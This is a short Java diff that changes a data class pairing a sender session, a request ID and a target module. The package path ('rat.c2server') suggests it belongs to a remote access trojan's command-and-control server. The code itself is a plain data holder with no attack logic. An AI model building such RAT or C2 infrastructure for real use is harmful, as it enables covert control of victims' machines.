@@ -1,15 +1,19 @@
 package devs.alex.sah.rat.c2server.models;
 
 import lombok.Getter;
+import lombok.NoArgsConstructor;
 
 @Getter
+@NoArgsConstructor
 public class AssociativePair {
-    String sessionUUID;
-    String requestUUID;
+    String senderSession;
+    String requestID;
+    String targetModule;
 
-    public AssociativePair(String sessionUUID, String requestUUID) {
-        this.sessionUUID = sessionUUID;
-        this.requestUUID = requestUUID;
+    public AssociativePair(String senderSession, String requestID, String targetModule) {
+        this.senderSession = senderSession;
+        this.requestID = requestID;
+        this.targetModule = targetModule;
     }
 
 }
